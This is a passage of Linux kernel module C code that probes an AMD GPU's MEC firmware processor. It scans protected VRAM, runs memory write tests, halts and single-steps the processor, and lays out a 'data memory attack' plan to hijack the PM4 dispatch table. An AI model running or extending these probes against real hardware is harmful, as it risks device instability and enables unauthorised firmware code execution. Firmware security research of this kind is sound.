										(void *)((unsigned long)next_val + test_off_b),
										4);
									pr_info("fw36: FW[+0x%llX] after = 0x%08X %s\n",
										test_off_b, verify,
										(verify == tag) ?
										"*** WRITABLE! ***" : "FAIL");
									/* Restore */
									copy_to_kernel_nofault(
										(void *)((unsigned long)next_val + test_off_b),
										&orig, 4);
									wmb();
								}
							}

							/* ICACHE FLUSH */
							{
								u32 pc_before = rr(regCP_MEC1_INSTR_PNTR);
								u32 rs64 = rr(regCP_MEC_RS64_CNTL);
								wr(regCP_MEC_RS64_CNTL, rs64 |
									(1 << CP_MEC_RS64_CNTL__MEC_INVALIDATE_ICACHE__SHIFT));
								udelay(200);
								wr(regCP_MEC_RS64_CNTL, rs64);
								udelay(500);
								pr_info("fw36: PC before=%04X after=%04X\n",
									pc_before, rr(regCP_MEC1_INSTR_PNTR));
							}
						}
					}
				}
			}
			pr_info("fw36: Found %d firmware-like entries in 0x97XX range\n",
				seq_count);
		}

		/* =====================================================
		 * STEP 5: TMR targeted VRAM scan
		 *
		 * TMR MC = 0x97E0000000, FB_BASE = 0x8000000000
		 * TMR VRAM offset = 0x97E0000000 - 0x8000000000 = 0x17E0000000
		 *
		 * But real VRAM is ~8GB (0x200000000). This offset (6.0GB)
		 * is within real VRAM. vram_access should work.
		 * Scan ±32MB around TMR offset for firmware signature.
		 * ===================================================== */
		if (vram_access) {
			u64 tmr_mc = 0x97E0000000ULL;
			u64 tmr_voff = tmr_mc - fb_base;
			u64 fw_bo_mc = 0x97FF800000ULL;  /* known FW BO GPU addr */
			u64 fw_bo_voff = fw_bo_mc - fb_base;
			u64 scan_start, scan_end, soff;
			int found = 0;

			pr_info("fw36: === STEP 5: TMR VRAM SCAN ===\n");
			pr_info("fw36: TMR VRAM offset = 0x%llX (%lluMB)\n",
				tmr_voff, tmr_voff >> 20);
			pr_info("fw36: FW BO VRAM offset = 0x%llX (%lluMB)\n",
				fw_bo_voff, fw_bo_voff >> 20);
			pr_info("fw36: Real VRAM = 0x%llX (%lluMB)\n",
				real_vram, real_vram >> 20);

			/* Read TMR start content */
			{
				u32 buf[8];
				int i;
				pr_info("fw36: TMR start pages:\n");
				for (i = 0; i < 8; i++) {
					u64 addr = tmr_voff + i * 0x1000;
					if (addr < real_vram) {
						vram_access(adev, addr, buf, 32, false);
						pr_info("fw36:   [TMR+0x%X]: %08X %08X %08X %08X %08X %08X %08X %08X\n",
							i * 0x1000,
							buf[0], buf[1], buf[2], buf[3],
							buf[4], buf[5], buf[6], buf[7]);
						if (buf[0] == fw_sig[0] && buf[1] == fw_sig[1])
							pr_info("fw36:   *** RS64 SIG AT TMR START! ***\n");
					} else {
						pr_info("fw36:   TMR+0x%X beyond VRAM\n",
							i * 0x1000);
					}
				}
			}

			/* Read FW BO start content via VRAM */
			{
				u32 buf[8];
				int i;
				pr_info("fw36: FW BO VRAM pages:\n");
				for (i = 0; i < 8; i++) {
					u64 addr = fw_bo_voff + i * 0x1000;
					if (addr < real_vram) {
						vram_access(adev, addr, buf, 32, false);
						pr_info("fw36:   [FWBO+0x%X]: %08X %08X %08X %08X %08X %08X %08X %08X\n",
							i * 0x1000,
							buf[0], buf[1], buf[2], buf[3],
							buf[4], buf[5], buf[6], buf[7]);
						if (buf[0] == fw_sig[0] && buf[1] == fw_sig[1])
							pr_info("fw36:   *** RS64 SIG AT FW BO! ***\n");
					}
				}
			}

			/* Scan TMR region: from TMR start to end of VRAM at 4KB steps */
			scan_start = tmr_voff;
			scan_end = real_vram;
			if (scan_end - scan_start > 0x10000000ULL)
				scan_end = scan_start + 0x10000000ULL; /* cap at 256MB */

			if (scan_start < real_vram) {
				pr_info("fw36: Scanning [0x%llX - 0x%llX] (%lluMB)...\n",
					scan_start, scan_end, (scan_end - scan_start) >> 20);

				for (soff = scan_start; soff < scan_end && found < 10;
				     soff += 0x1000) {
					u32 hdr[4];
					vram_access(adev, soff, hdr, 16, false);

					if (hdr[0] == fw_sig[0] && hdr[1] == fw_sig[1]) {
						pr_info("fw36: *** FW SIG at VRAM+0x%llX (TMR+0x%llX)! ***\n",
							soff, soff - tmr_voff);
						found++;

						/* Dump 4 pages */
						{
							int p;
							for (p = 0; p < 4; p++) {
								u32 pg[8];
								vram_access(adev, soff + p * 0x1000, pg, 32, false);
								pr_info("fw36:   +0x%X: %08X %08X %08X %08X %08X %08X %08X %08X\n",
									p * 0x1000,
									pg[0], pg[1], pg[2], pg[3],
									pg[4], pg[5], pg[6], pg[7]);
							}
						}

						/* WRITE TEST */
						{
							u32 orig, tag = 0xFEE10013, verify;
							u64 woff = soff + 0x10000;
							if (woff < real_vram) {
								vram_access(adev, woff, &orig, 4, false);
								vram_access(adev, woff, &tag, 4, true);
								vram_access(adev, woff, &verify, 4, false);
								pr_info("fw36: VRAM write test at +0x%llX: wrote 0x%X read 0x%X %s\n",
									woff, tag, verify,
									(verify == tag) ? "*** SUCCESS ***" : "FAIL");
								vram_access(adev, woff, &orig, 4, true);
							}
						}
					}

					/* Also look for PSP container headers */
					if (hdr[0] == 0x0006D3E0) {
						pr_info("fw36: PSP container at VRAM+0x%llX (TMR+0x%llX): %08X %08X %08X %08X\n",
							soff, soff - tmr_voff,
							hdr[0], hdr[1], hdr[2], hdr[3]);
						found++;
					}
				}
				pr_info("fw36: TMR scan done: %d hits\n", found);
			} else {
				pr_info("fw36: TMR offset 0x%llX beyond VRAM size 0x%llX\n",
					tmr_voff, real_vram);
			}

			/* =====================================================
			 * STEP 6: Scan 2GB-6GB gap (missed by mode 14)
			 * Mode 14 scanned 0-2GB. TMR is at ~6GB. This fills
			 * the gap, scanning at coarser 64KB steps for speed.
			 * ===================================================== */
			if (real_vram > 0x80000000ULL) {
				u64 gap_start = 0x80000000ULL; /* 2GB */
				u64 gap_end = (tmr_voff < real_vram) ? tmr_voff : real_vram;

				pr_info("fw36: === STEP 6: VRAM GAP SCAN [2GB - %lluMB] ===\n",
					gap_end >> 20);
				found = 0;
				for (soff = gap_start; soff < gap_end && found < 10;
				     soff += 0x10000) { /* 64KB steps */
					u32 hdr[4];
					vram_access(adev, soff, hdr, 16, false);
					if (hdr[0] == fw_sig[0] && hdr[1] == fw_sig[1]) {
						pr_info("fw36: *** FW SIG at VRAM+0x%llX! ***\n", soff);
						found++;
					}
					if (hdr[0] == 0x0006D3E0) {
						pr_info("fw36: PSP header at VRAM+0x%llX\n", soff);
						found++;
					}
				}
				if (!found)
					pr_info("fw36: No firmware in 2GB-TMR gap\n");
			}
		} else {
			pr_info("fw36: vram_access not available\n");
		}

		/* =====================================================
		 * STEP 7: Try Resizable BAR
		 *
		 * BAR 0 is 256MB but supports resize up to 64GB.
		 * If we can resize it, we get direct CPU access to all VRAM.
		 * ===================================================== */
		pr_info("fw36: === STEP 7: RESIZABLE BAR PROBE ===\n");
		{
			struct resource *bar0 = &g_pdev->resource[0];
			pr_info("fw36: BAR0: start=0x%llX end=0x%llX size=0x%llX flags=0x%lX\n",
				(u64)bar0->start, (u64)bar0->end,
				(u64)(bar0->end - bar0->start + 1),
				bar0->flags);
			pr_info("fw36: BAR2: start=0x%llX size=0x%llX\n",
				(u64)g_pdev->resource[2].start,
				(u64)(g_pdev->resource[2].end -
				      g_pdev->resource[2].start + 1));

			/* Check if rebar is supported */
			{
				int pos = pci_find_ext_capability(g_pdev,
					PCI_EXT_CAP_ID_REBAR);
				if (pos) {
					u32 ctrl;
					pci_read_config_dword(g_pdev, pos + 8, &ctrl);
					pr_info("fw36: ReBAR capability at 0x%X, ctrl=0x%08X\n",
						pos, ctrl);
					pr_info("fw36: ReBAR sizes supported: 0x%X\n",
						(ctrl >> 4) & 0x3F);
					pr_info("fw36: Current BAR size index: %d\n",
						(ctrl >> 8) & 0x3F);
					pr_info("fw36: NOTE: BAR resize requires driver unbind + PCI rescan\n");
				} else {
					pr_info("fw36: No ReBAR capability found\n");
				}
			}
		}
	}

	pr_info("fw36: === MODE 15 COMPLETE ===\n");
	pr_info("fw36: MEC PC = 0x%04X\n", rr(regCP_MEC1_INSTR_PNTR));
	#undef GC0
}

/* Mode 16: Read MEC instructions via ucode registers and debug mode
 *
 * Three approaches:
 * A) Legacy UCODE_ADDR/UCODE_DATA interface — may still work for RS64
 * B) RS64 halt + step + register read — observe PC changes and data
 * C) Instruction cache invalidation + data memory probing
 * D) MM_INDEX at IC_BASE sub-ranges (physical mode addressing)
 */
static void mec_ucode_read(void *psp, void *adev)
{
	u32 gc_base0;
	u64 ic_base;
	u32 mec_cntl_orig, rs64_cntl_orig, pc_orig;

	pr_info("fw36: === MODE 16: MEC UCODE READ ===\n");

	gc_base0 = find_gc_base0(adev);
	if (!gc_base0) { pr_info("fw36: gc_base0 FAIL\n"); return; }

	#define GC0(r) (gc_base0 + (r))
	ic_base = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) | rr(regCP_CPC_IC_BASE_LO);
	mec_cntl_orig = rr(regCP_MEC_CNTL);
	rs64_cntl_orig = rr(regCP_MEC_RS64_CNTL);
	pc_orig = rr(regCP_MEC1_INSTR_PNTR);

	pr_info("fw36: IC_BASE=0x%llX PC=0x%04X MEC_CNTL=0x%08X RS64_CNTL=0x%08X\n",
		ic_base, pc_orig, mec_cntl_orig, rs64_cntl_orig);

	/* ===========================================
	 * APPROACH A: Legacy UCODE_ADDR/UCODE_DATA
	 *
	 * On pre-RS64 GPUs, writing to UCODE_ADDR and reading UCODE_DATA
	 * returned the microcode at that address. RS64 might still expose
	 * this for debug or compatibility.
	 * =========================================== */
	pr_info("fw36: === APPROACH A: UCODE_ADDR/UCODE_DATA ===\n");
	{
		u32 orig_addr = rr(regCP_MEC_ME1_UCODE_ADDR);
		int i;

		pr_info("fw36: Current UCODE_ADDR = 0x%08X\n", orig_addr);

		/* Read at address 0 (firmware start) */
		wr(regCP_MEC_ME1_UCODE_ADDR, 0);
		udelay(10);
		pr_info("fw36: UCODE[0x0000]:");
		for (i = 0; i < 16; i++) {
			u32 data = rr(regCP_MEC_ME1_UCODE_DATA);
			if (i % 4 == 0 && i > 0)
				pr_info("fw36: UCODE[0x%04X]:", i);
			pr_cont(" %08X", data);
			if (i % 4 == 3) pr_cont("\n");
		}

		/* Read at PC address */
		wr(regCP_MEC_ME1_UCODE_ADDR, pc_orig);
		udelay(10);
		pr_info("fw36: UCODE[PC=0x%04X]:", pc_orig);
		for (i = 0; i < 8; i++) {
			u32 data = rr(regCP_MEC_ME1_UCODE_DATA);
			pr_cont(" %08X", data);
			if (i % 4 == 3) pr_cont("\n");
			if (i == 3) pr_info("fw36: UCODE[0x%04X]:", pc_orig + 4);
		}

		/* Restore */
		wr(regCP_MEC_ME1_UCODE_ADDR, orig_addr);

		/* Check if data is non-zero and non-constant */
		wr(regCP_MEC_ME1_UCODE_ADDR, 0);
		udelay(10);
		{
			u32 d0 = rr(regCP_MEC_ME1_UCODE_DATA);
			u32 d1 = rr(regCP_MEC_ME1_UCODE_DATA);
			u32 d2 = rr(regCP_MEC_ME1_UCODE_DATA);
			if (d0 == 0 && d1 == 0 && d2 == 0)
				pr_info("fw36: UCODE reads all zeros (interface disabled for RS64)\n");
			else if (d0 == d1 && d1 == d2)
				pr_info("fw36: UCODE reads constant 0x%08X (stub?)\n", d0);
			else
				pr_info("fw36: UCODE reads varying data — interface works!\n");
		}
		wr(regCP_MEC_ME1_UCODE_ADDR, orig_addr);
	}

	/* ===========================================
	 * APPROACH B: RS64 Halt + Step + observe
	 *
	 * Halt the MEC, then single-step and read PC + data memory
	 * changes. This lets us infer what instructions are executing
	 * even if we can't read them directly.
	 *
	 * Also: while halted, try reading the instruction at PC through
	 * various debug interfaces.
	 * =========================================== */
	pr_info("fw36: === APPROACH B: HALT + STEP DEBUG ===\n");
	{
		u32 pc_before, pc_after;
		int step;

		/* HALT MEC (ME2 — bit 30) */
		wr(regCP_MEC_RS64_CNTL, rs64_cntl_orig | (1 << 30));
		udelay(100);
		pc_before = rr(regCP_MEC1_INSTR_PNTR);
		pr_info("fw36: Halted MEC. PC = 0x%04X\n", pc_before);

		/* Read exception status while halted */
		{
			u32 exc = rr(regCP_MEC_RS64_EXCEPTION_STATUS);
			pr_info("fw36: Exception status = 0x%08X\n", exc);
		}

		/* Read data memory at PC address range (MEC might mirror instructions) */
		pr_info("fw36: === DATA MEMORY AROUND PC ===\n");
		{
			int i;
			u32 dm_data[16];
			/* Set DM index to PC address (instructions might be data-mapped) */
			wr(regCP_MEC_DM_INDEX_ADDR, pc_before * 4); /* word-addressed to byte */
			udelay(10);
			for (i = 0; i < 16; i++) {
				dm_data[i] = rr(regCP_MEC_DM_INDEX_DATA);
			}
			pr_info("fw36: DM[PC*4=0x%04X]: %08X %08X %08X %08X\n",
				pc_before * 4,
				dm_data[0], dm_data[1], dm_data[2], dm_data[3]);
			pr_info("fw36: DM[+16]:          %08X %08X %08X %08X\n",
				dm_data[4], dm_data[5], dm_data[6], dm_data[7]);
			pr_info("fw36: DM[+32]:          %08X %08X %08X %08X\n",
				dm_data[8], dm_data[9], dm_data[10], dm_data[11]);
			pr_info("fw36: DM[+48]:          %08X %08X %08X %08X\n",
				dm_data[12], dm_data[13], dm_data[14], dm_data[15]);
		}

		/* Read instruction bounds */
		{
			u32 mibound_lo = rr(regCP_MEC_MIBOUND_LO);
			u32 mibound_hi = rr(regCP_MEC_MIBOUND_HI);
			u32 mdbase_lo  = rr(regCP_MEC_MDBASE_LO);
			u32 mdbase_hi  = rr(regCP_MEC_MDBASE_HI);
			pr_info("fw36: MDBASE = 0x%08X%08X MIBOUND = 0x%08X%08X\n",
				mdbase_hi, mdbase_lo, mibound_hi, mibound_lo);
		}

		/* Read IC_OP_CNTL to check instruction cache state */
		{
			u32 ic_op = rr(regCP_CPC_IC_OP_CNTL);
			u32 ic_cntl = rr(regCP_CPC_IC_BASE_CNTL);
			u32 dc_cntl = rr(regCP_MEC_DC_BASE_CNTL);
			u32 dc_op = rr(regCP_MEC_DC_OP_CNTL);
			pr_info("fw36: IC_OP_CNTL=0x%08X IC_BASE_CNTL=0x%08X\n",
				ic_op, ic_cntl);
			pr_info("fw36: DC_BASE_CNTL=0x%08X DC_OP_CNTL=0x%08X\n",
				dc_cntl, dc_op);
		}

		/* Single-step: execute one instruction and observe PC change */
		pr_info("fw36: === SINGLE STEP TEST (5 steps) ===\n");
		for (step = 0; step < 5; step++) {
			u32 dm0_before, dm0_after;

			pc_before = rr(regCP_MEC1_INSTR_PNTR);

			/* Read DM[0] as a "canary" — if instruction writes to DM, we'll see it */
			wr(regCP_MEC_DM_INDEX_ADDR, 0);
			udelay(5);
			dm0_before = rr(regCP_MEC_DM_INDEX_DATA);

			/* STEP: set bit 31 (step) while keeping bit 30 (halt) */
			wr(regCP_MEC_RS64_CNTL, rs64_cntl_orig | (1 << 30) | (1 << 31));
			udelay(50);
			/* Clear step bit, keep halt */
			wr(regCP_MEC_RS64_CNTL, rs64_cntl_orig | (1 << 30));
			udelay(50);

			pc_after = rr(regCP_MEC1_INSTR_PNTR);
			wr(regCP_MEC_DM_INDEX_ADDR, 0);
			udelay(5);
			dm0_after = rr(regCP_MEC_DM_INDEX_DATA);

			pr_info("fw36: Step %d: PC 0x%04X → 0x%04X (delta=%d) DM[0]: 0x%08X → 0x%08X\n",
				step, pc_before, pc_after,
				(int)pc_after - (int)pc_before,
				dm0_before, dm0_after);
		}

		/* UNHALT MEC */
		wr(regCP_MEC_RS64_CNTL, rs64_cntl_orig);
		udelay(200);
		pr_info("fw36: Unhalted MEC. PC = 0x%04X (should resume)\n",
			rr(regCP_MEC1_INSTR_PNTR));
	}

	/* ===========================================
	 * APPROACH C: Scan GC registers for debug/trace interfaces
	 *
	 * GFX12 RS64 cores may have:
	 *   - Debug data output registers
	 *   - Instruction trace buffer
	 *   - Performance counter instruction count
	 * Scan a range of GC registers for non-zero values that
	 * might expose instruction fetch data.
	 * =========================================== */
	pr_info("fw36: === APPROACH C: GC REGISTER SCAN (RS64 DEBUG) ===\n");
	{
		/* RS64 debug registers are typically near the RS64 control block.
		 * regCP_MEC_RS64_CNTL is at SOC15(0x2904). Scan nearby regs. */
		int r;
		struct { u32 reg; const char *name; } debug_regs[] = {
			{ SOC15(0x2900), "RS64_PRGRM_CNTR_START" },
			{ SOC15(0x2901), "RS64_2901" },
			{ SOC15(0x2902), "RS64_2902" },
			{ SOC15(0x2903), "RS64_2903" },
			{ SOC15(0x2904), "RS64_CNTL" },
			{ SOC15(0x2905), "RS64_2905" },
			{ SOC15(0x2906), "RS64_2906" },
			{ SOC15(0x2907), "RS64_2907" },
			{ SOC15(0x2908), "RS64_2908" },
			{ SOC15(0x2909), "RS64_2909" },
			{ SOC15(0x290a), "RS64_290A" },
			{ SOC15(0x290b), "DC_BASE_CNTL" },
			{ SOC15(0x290c), "DC_OP_CNTL" },
			{ SOC15(0x290d), "RS64_290D" },
			{ SOC15(0x290e), "RS64_290E" },
			{ SOC15(0x290f), "RS64_290F" },
			{ SOC15(0x2930), "RS64_2930" },
			{ SOC15(0x2931), "RS64_2931" },
			{ SOC15(0x2932), "RS64_2932" },
			{ SOC15(0x2933), "RS64_2933" },
			{ SOC15(0x2934), "RS64_2934" },
			{ SOC15(0x2935), "RS64_2935" },
			{ SOC15(0x2936), "RS64_2936" },
			{ SOC15(0x2937), "RS64_EXCEPTION_STATUS" },
			{ SOC15(0x2938), "RS64_PRGRM_CNTR_START_HI" },
			{ SOC15(0x2939), "RS64_2939" },
			{ SOC15(0x293a), "RS64_293A" },
			{ SOC15(0x293b), "RS64_293B" },
			{ SOC15(0x293c), "RS64_293C" },
			{ SOC15(0x293d), "RS64_293D" },
			{ SOC15(0x293e), "RS64_293E" },
			{ SOC15(0x293f), "RS64_293F" },
		};

		for (r = 0; r < (int)(sizeof(debug_regs)/sizeof(debug_regs[0])); r++) {
			u32 val = rr(debug_regs[r].reg);
			if (val != 0)
				pr_info("fw36: %s (0x%X) = 0x%08X\n",
					debug_regs[r].name, debug_regs[r].reg, val);
		}

		/* Also scan the MEC-specific instruction/data access regs */
		pr_info("fw36: === MEC INDEXED REGISTERS (0x5800-0x58FF) ===\n");
		for (r = 0x5840; r <= 0x58A0; r++) {
			u32 val = rr(SOC15(r));
			if (val != 0)
				pr_info("fw36: GC_0x%04X = 0x%08X\n", r, val);
		}

		/* Scan for instruction fetch debug output (0x5C00 range) */
		pr_info("fw36: === MEC DM/IC INTERFACE (0x5C00-0x5C10) ===\n");
		for (r = 0x5C00; r <= 0x5C10; r++) {
			u32 val = rr(SOC15(r));
			if (val != 0)
				pr_info("fw36: GC_0x%04X = 0x%08X\n", r, val);
		}
	}

	/* ===========================================
	 * APPROACH D: IC_BASE as GPU physical address — try MM_INDEX
	 *
	 * In physical/bypass mode, IC_BASE=0x20681D4000.
	 * The "0x20" prefix might be an address space qualifier.
	 * Try reading at 0x681D4000 (strip top bits), which could be
	 * a physical VRAM offset or MMIO offset.
	 * Also try the PRGRM_CNTR_START value as an alternative base.
	 * =========================================== */
	pr_info("fw36: === APPROACH D: IC_BASE PHYSICAL PROBES ===\n");
	{
		u32 prg_start_lo = rr(regCP_MEC_RS64_PRGRM_CNTR_START);
		u32 prg_start_hi = rr(regCP_MEC_RS64_PRGRM_CNTR_START_HI);
		u64 prg_start = ((u64)prg_start_hi << 32) | prg_start_lo;

		pr_info("fw36: PRGRM_CNTR_START = 0x%llX\n", prg_start);
		pr_info("fw36: IC_BASE          = 0x%llX\n", ic_base);

		/* The actual instruction fetch address for a given PC:
		 * fetch_addr = IC_BASE + (PC * 4)
		 * At PC=0x04A7: fetch_addr = 0x20681D4000 + 0x129C = 0x20681D529C
		 *
		 * Try using MM_INDEX to read at IC_BASE-relative offsets.
		 * Strip various high-bit patterns to find the right mapping. */
		{
			u64 strip_masks[] = {
				0xFFFFFFFFFFULL,   /* 40-bit */
				0xFFFFFFFFULL,     /* 32-bit */
				0x1FFFFFFFFFULL,   /* 37-bit (strip bit 37) */
				0x3FFFFFFFFFULL,   /* 38-bit */
			};
			const char *mask_names[] = {
				"40-bit", "32-bit", "37-bit", "38-bit"
			};
			int m;

			for (m = 0; m < 4; m++) {
				u64 addr = ic_base & strip_masks[m];
				u32 d[4];
				int k;

				writel((u32)(addr) | 0x80000000, mmio + 0x0000);
				writel((u32)(addr >> 31), mmio + 0x0018);
				d[0] = readl(mmio + 0x0004);

				for (k = 1; k < 4; k++) {
					writel((u32)(addr + k * 4) | 0x80000000, mmio + 0x0000);
					writel((u32)((addr + k * 4) >> 31), mmio + 0x0018);
					d[k] = readl(mmio + 0x0004);
				}

				pr_info("fw36: MM_INDEX[%s 0x%llX]: %08X %08X %08X %08X\n",
					mask_names[m], addr, d[0], d[1], d[2], d[3]);
			}

			/* Also try PRGRM_CNTR_START as base */
			if (prg_start != 0 && prg_start != ic_base) {
				u64 addr = prg_start & 0xFFFFFFFFFFULL;
				u32 d[4];
				int k;
				for (k = 0; k < 4; k++) {
					writel((u32)(addr + k * 4) | 0x80000000, mmio + 0x0000);
					writel((u32)((addr + k * 4) >> 31), mmio + 0x0018);
					d[k] = readl(mmio + 0x0004);
				}
				pr_info("fw36: MM_INDEX[PRG_START 0x%llX]: %08X %08X %08X %08X\n",
					addr, d[0], d[1], d[2], d[3]);
			}
		}
	}

	/* ===========================================
	 * APPROACH E: Try GFX12 register-indexed instruction read
	 *
	 * Some GFX versions allow reading instruction memory through
	 * an indexed interface similar to DM_INDEX but for instructions.
	 * Check if MIBASE/MIBOUND define the instruction memory window
	 * and if writing to the IC address index yields instruction data.
	 * =========================================== */
	pr_info("fw36: === APPROACH E: INSTRUCTION INDEXED READ ===\n");
	{
		/* Try setting IC_OP_CNTL to trigger an instruction cache read.
		 * Bit fields vary by generation but typically:
		 * bit 0 = prime_icache, bit 1 = invalidate_cache
		 * Some versions have a "read data" mode. */
		u32 ic_op_orig = rr(regCP_CPC_IC_OP_CNTL);
		int i;

		pr_info("fw36: IC_OP_CNTL = 0x%08X\n", ic_op_orig);

		/* Try writing the PC-relative address to UCODE_ADDR
		 * and reading UCODE_DATA multiple times */
		wr(regCP_MEC_ME1_UCODE_ADDR, 0x04A7);
		udelay(10);
		pr_info("fw36: UCODE at PC 0x04A7:");
		for (i = 0; i < 4; i++) {
			u32 d = rr(regCP_MEC_ME1_UCODE_DATA);
			pr_cont(" %08X", d);
		}
		pr_cont("\n");

		/* Try absolute IC_BASE byte offset in UCODE_ADDR */
		wr(regCP_MEC_ME1_UCODE_ADDR, 0x04A7 * 4);
		udelay(10);
		pr_info("fw36: UCODE at byte 0x%X:", 0x04A7 * 4);
		for (i = 0; i < 4; i++) {
			u32 d = rr(regCP_MEC_ME1_UCODE_DATA);
			pr_cont(" %08X", d);
		}
		pr_cont("\n");

		/* Restore */
		wr(regCP_MEC_ME1_UCODE_ADDR, 0);
	}

	pr_info("fw36: === MODE 16 COMPLETE ===\n");
	pr_info("fw36: MEC PC = 0x%04X (expected ~0x%04X)\n",
		rr(regCP_MEC1_INSTR_PNTR), pc_orig);
	#undef GC0
}

/* =============================================================================
 * Mode 17: MDBASE PROBE — MEC Data Memory Attack
 *
 * MDBASE = 0x3B73D68E0000 is the MEC's data memory base address.
 * Unlike instruction memory (encrypted in TMR, PSP-locked IC_BASE),
 * data memory MUST be writable by the GPU for ring buffer processing,
 * dispatch tables, PM4 opcode handlers, and scratch state.
 *
 * If we can read/write MEC data memory, we can:
 *   - Find the PM4 dispatch table (array of handler addresses)
 *   - Redirect a dispatch entry to point at our code
 *   - Submit a PM4 packet with that opcode → MEC jumps to our handler
 *
 * Attack surface:
 *   A) IOMMU translation of MDBASE → CPU phys → memremap
 *   B) MM_INDEX indirect read at MDBASE (if it's an MC address)
 *   C) DM_INDEX with MEC halted (retry with proper halt sequence)
 *   D) Scan adev for kernel mapping of data memory buffer
 *   E) DC_BASE/DC_OP manipulation for data cache read-out
 *   F) Write to DM_INDEX while halted (test writability)
 * ============================================================================= */
static void mdbase_probe(void *psp, void *adev)
{
	u32 gc_base0;
	u64 mdbase, ic_base, fb_base;
	u32 mibound_lo, mibound_hi;
	u32 mec_cntl_orig, rs64_cntl_orig, pc_val;
	u32 dc_base_cntl_orig, dc_op_cntl_orig;

	pr_info("fw36: === MODE 17: MDBASE PROBE (MEC Data Memory) ===\n");

	gc_base0 = find_gc_base0(adev);
	if (!gc_base0) { pr_info("fw36: gc_base0 FAIL\n"); return; }
	#define GC0(r) (gc_base0 + (r))

	/* Read current state */
	mdbase = ((u64)rr(regCP_MEC_MDBASE_HI) << 32) | rr(regCP_MEC_MDBASE_LO);
	mibound_lo = rr(regCP_MEC_MIBOUND_LO);
	mibound_hi = rr(regCP_MEC_MIBOUND_HI);
	ic_base = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) | rr(regCP_CPC_IC_BASE_LO);
	fb_base = (u64)rr(GC0(0x1614)) << 24;
	mec_cntl_orig = rr(regCP_MEC_CNTL);
	rs64_cntl_orig = rr(regCP_MEC_RS64_CNTL);
	dc_base_cntl_orig = rr(regCP_MEC_DC_BASE_CNTL);
	dc_op_cntl_orig = rr(regCP_MEC_DC_OP_CNTL);
	pc_val = rr(regCP_MEC1_INSTR_PNTR);

	pr_info("fw36: MDBASE     = 0x%016llX\n", mdbase);
	pr_info("fw36: MIBOUND    = 0x%08X:%08X\n", mibound_hi, mibound_lo);
	pr_info("fw36: IC_BASE    = 0x%016llX\n", ic_base);
	pr_info("fw36: FB_BASE    = 0x%016llX\n", fb_base);
	pr_info("fw36: DC_BASE_CNTL = 0x%08X  DC_OP_CNTL = 0x%08X\n",
		dc_base_cntl_orig, dc_op_cntl_orig);
	pr_info("fw36: MEC_CNTL   = 0x%08X  RS64_CNTL = 0x%08X  PC = 0x%04X\n",
		mec_cntl_orig, rs64_cntl_orig, pc_val);

	/* Analyze MDBASE address space */
	{
		u64 md_fb_off = 0;
		int in_vram = 0;
		if (mdbase >= fb_base && mdbase < fb_base + 0x200000000ULL) {
			md_fb_off = mdbase - fb_base;
			in_vram = 1;
			pr_info("fw36: MDBASE is in VRAM range, offset = 0x%llX\n", md_fb_off);
		} else {
			pr_info("fw36: MDBASE 0x%llX NOT in VRAM [0x%llX, 0x%llX)\n",
				mdbase, fb_base, fb_base + 0x200000000ULL);
			pr_info("fw36: May be system memory (GART) or unmapped MC address\n");
		}

		/* Check if MDBASE is in GART range */
		{
			u64 gart_base = (u64)rr(GC0(0x160C)) << 12;  /* MC_VM_FB_OFFSET */
			u64 gart_lo = ((u64)rr(GC0(0x1608)) << 32) | ((u64)rr(GC0(0x1607)) << 12);
			pr_info("fw36: GART base approx = 0x%llX, MC_VM_FB_OFFSET<<12 = 0x%llX\n",
				gart_lo, gart_base);
		}
		(void)md_fb_off;
		(void)in_vram;
	}

	/* ===========================================
	 * APPROACH A: IOMMU translation of MDBASE
	 * =========================================== */
	pr_info("fw36: === APPROACH A: IOMMU TRANSLATION ===\n");
	{
		struct iommu_domain *domain;
		domain = iommu_get_domain_for_dev(&g_pdev->dev);
		if (domain) {
			phys_addr_t phys;
			u64 tries[] = {
				mdbase,
				mdbase & 0xFFFFFFFFFFULL,   /* 40-bit mask */
				mdbase & 0xFFFFFFFFULL,      /* 32-bit mask */
				mdbase & 0x3FFFFFFFFFULL,    /* 38-bit mask */
			};
			int t;

			for (t = 0; t < 4; t++) {
				phys = iommu_iova_to_phys(domain, tries[t]);
				if (phys) {
					void *mapped;
					pr_info("fw36: IOMMU(0x%llX) = PHYS 0x%llX *** HIT ***\n",
						tries[t], (u64)phys);

					/* Try to map and read */
					mapped = memremap(phys, 0x10000, MEMREMAP_WB);
					if (mapped) {
						int i;
						u32 *p = (u32 *)mapped;
						pr_info("fw36: MDBASE memremap SUCCESS at phys 0x%llX\n",
							(u64)phys);
						for (i = 0; i < 256; i += 4) {
							if (p[i] || p[i+1] || p[i+2] || p[i+3]) {
								pr_info("fw36: DM[0x%04X]: %08X %08X %08X %08X\n",
									i*4, p[i], p[i+1], p[i+2], p[i+3]);
							}
						}
						/* Look for dispatch-table-like patterns:
						 * sequences of similar-valued 32-bit words
						 * (handler addresses in instruction space) */
						pr_info("fw36: === DISPATCH TABLE SCAN ===\n");
						{
							int j, seq_start = -1, seq_count = 0;
							u32 prev_hi = 0;
							for (j = 0; j < 16384; j++) {
								u32 val = p[j];
								u32 hi = val >> 16;
								/* Dispatch entries typically share upper bits */
								if (hi == prev_hi && hi != 0 && hi != 0xFFFF) {
									if (seq_start < 0) seq_start = j - 1;
									seq_count++;
								} else {
									if (seq_count >= 4) {
										int k;
										pr_info("fw36: DISPATCH? offset 0x%X, %d entries:\n",
											seq_start * 4, seq_count + 1);
										for (k = seq_start; k <= seq_start + seq_count && k < 16384; k++)
											pr_info("fw36:   [%d] = 0x%08X\n",
												k - seq_start, p[k]);
									}
									seq_start = -1;
									seq_count = 0;
								}
								prev_hi = hi;
							}
						}
						memunmap(mapped);
					} else {
						pr_info("fw36: memremap(0x%llX) failed\n", (u64)phys);
					}
				} else {
					pr_info("fw36: IOMMU(0x%llX) = 0 (no mapping)\n", tries[t]);
				}
			}
		} else {
			pr_info("fw36: No IOMMU domain for GPU device\n");
		}
	}

	/* ===========================================
	 * APPROACH B: MM_INDEX indirect read at MDBASE
	 *
	 * If MDBASE is an MC address accessible through the
	 * GPU's memory controller, MM_INDEX should work.
	 * =========================================== */
	pr_info("fw36: === APPROACH B: MM_INDEX AT MDBASE ===\n");
	{
		u64 addrs[] = {
			mdbase,
			mdbase & 0xFFFFFFFFULL,
			mdbase & 0xFFFFFFFFFFULL,
			mdbase - fb_base,  /* VRAM offset if in FB range */
		};
		int a, i;

		for (a = 0; a < 4; a++) {
			u32 vals[8];
			int nonzero = 0, all_f = 1;

			for (i = 0; i < 8; i++) {
